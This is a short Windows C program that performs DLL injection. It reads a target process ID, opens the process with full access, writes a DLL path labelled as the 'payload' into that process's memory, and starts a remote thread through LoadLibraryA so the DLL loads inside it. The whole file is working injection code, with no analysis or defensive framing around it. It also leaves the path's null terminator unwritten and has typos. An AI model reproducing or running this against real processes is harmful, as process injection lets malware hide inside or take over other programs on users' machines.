#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>
#include <string.h>

int main() {
	DWORD pid;
	int i = scanf("%ld", &pid);

	printf("\nThe PID of the injceted process is: %ld\n", pid);

	// Path to payload
	LPCSTR dllPath = "Dll.dll";

	// Get process handle passing in the process ID.
	HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
	if (process == NULL) {
		printf("Error: the specified process couldn't be found.\n");
		goto Exit;
	}

	LPVOID addr = (LPVOID)GetProcAddress(GetModuleHandle(TEXT("KERNEL32.dll")), "LoadLibraryA");
	if (addr == NULL) {
		printf("Error: the LoadLibraryA function was not found inside kernel32.dll library.\n");
		goto Exit;
	}


	// Allocate new memory region inside the process's address space.	 
	LPVOID arg = VirtualAllocEx(process, NULL, strlen(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (arg == NULL) {
		printf("Error: the memory could not be allocated inside the chosen process.\n");
		goto Exit;
	}

	// Write the argument to LoadLibraryA to the process's newly allocated memory region. 
	int n = WriteProcessMemory(process, arg, (LPCVOID)dllPath, strlen(dllPath), 0);
	if (n == 0) {
		printf("Error: there was no bytes written to the process's address space.\n");
		goto Exit;
	}

	DWORD tid;
	// Inject our DLL into the process's address space.
	HANDLE  threadID = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)addr, arg, 0, &tid);
	if (threadID == NULL) {
		printf("Error: the remote thread could not be created.\n");
		goto Exit;
	}
	else {
		printf("Success: the remote thread was successfully created.\n");
		goto Exit;
	}

	Exit:// Close the handle to the process, becuase we've already injected the DLL.
		if (process)
			CloseHandle(process);
		return 0;
}